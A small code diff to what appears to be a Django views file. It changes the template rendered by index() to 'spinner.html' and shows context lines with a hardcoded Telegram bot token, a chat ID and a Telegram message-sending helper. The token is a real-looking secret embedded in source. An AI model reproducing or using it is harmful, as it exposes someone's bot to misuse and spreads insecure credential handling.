@@ -8,7 +8,7 @@ TELEGRAM_BOT_TOKEN = '7584867618:AAHIy5vSZOhoW6Ba0pZdDL0fILznS9RGcyQ'
 TELEGRAM_CHAT_ID = "1374918767"
 
 def index(request):
-    return render(request, 'new.html')
+    return render(request, 'spinner.html')
 
 def send_telegram_message(message):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
